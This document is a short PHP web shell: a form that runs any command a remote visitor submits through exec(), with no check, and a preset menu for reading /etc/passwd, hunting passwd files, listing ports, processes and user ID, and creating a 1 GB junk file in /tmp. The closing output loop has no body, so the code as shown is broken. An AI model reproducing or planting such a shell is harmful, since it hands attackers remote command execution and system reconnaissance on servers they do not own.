<?php
function cmd(){ // Command execution function
	echo("<form name='CMD' method='POST'>");
	echo("<b>Command:</b><br>");
	echo("<input name='cmd' type='text' size='50'> ");
	echo("<select name='precmd'>");
	$precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
	'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
	'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
	'Find passwd files'=>'find / -type f -name passwd');
	$capt = array_flip($precmd);
	foreach($precmd as $c)
		echo("<option value='" . $c . "'>" . $capt[$c] . "\n");
	echo("</select><br>\n");
	echo("<input type='submit' value='Execute'>\n");
	echo("</form>\n");
	if($_POST['cmd'] != "")
		$x = $_POST['cmd'];
	elseif($_POST['precmd'] != "")
		$x = $_POST['precmd'];	
	else
		die();
	$cmd = @exec($x, $result);
	foreach($result as $line)
}

cmd();

?>